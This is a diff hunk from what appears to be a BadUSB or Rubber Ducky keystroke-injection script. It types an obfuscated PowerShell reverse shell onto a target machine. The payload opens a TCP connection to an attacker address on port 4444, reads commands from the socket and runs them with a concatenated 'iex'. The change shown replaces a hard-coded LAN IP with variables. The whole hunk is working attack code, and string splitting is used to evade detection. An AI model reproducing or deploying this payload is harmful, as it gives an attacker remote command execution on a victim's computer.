@@ -17,7 +17,7 @@ ENTER
 DELAY 200
 STRING $I='0.0.0.0';$P=4444;$0LVhbQ=  [TyPE]('tExT'+'.enCOD'+'InG') ; $C=.('New'+'-Obj'+'ect') System.Net.Sockets.TCPCl
 DELAY 200
-STRING ient('192.168.178.25',4444);$S=$C.GetStream();[byte[]]$b=0..65535|&('%'){0};while(($i=$S.Read($b, 0, $b.Length)) -n
+STRING ient($I,$P);$S=$C.GetStream();[byte[]]$b=0..65535|&('%'){0};while(($i=$S.Read($b, 0, $b.Length)) -n
 DELAY 200
 STRING e 0){;$d=(&('New'+'-Ob'+'ject') -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb=(&('ie'+'x') $d 2>&1 | .
 DELAY 200
